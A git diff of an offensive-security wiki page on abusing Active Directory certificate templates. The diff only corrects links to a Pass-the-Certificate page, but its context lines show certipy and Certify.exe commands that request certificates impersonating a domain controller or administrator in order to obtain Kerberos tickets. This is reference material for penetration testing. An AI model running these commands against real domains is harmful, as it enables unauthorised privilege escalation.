@@ -61,7 +61,7 @@ certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca "$CA_NAME" -te
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca "$CA_NAME" -template "$TEMPLATE" -dns "$DC_HOST"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate.
 
 
 === Windows
@@ -85,7 +85,7 @@ Once the right template is found (i.e. the default User template), a request sha
 Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
 ```
 
-The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the/pass-the-certificate.md) to obtain a TGT and authenticate.
 
 :::
 
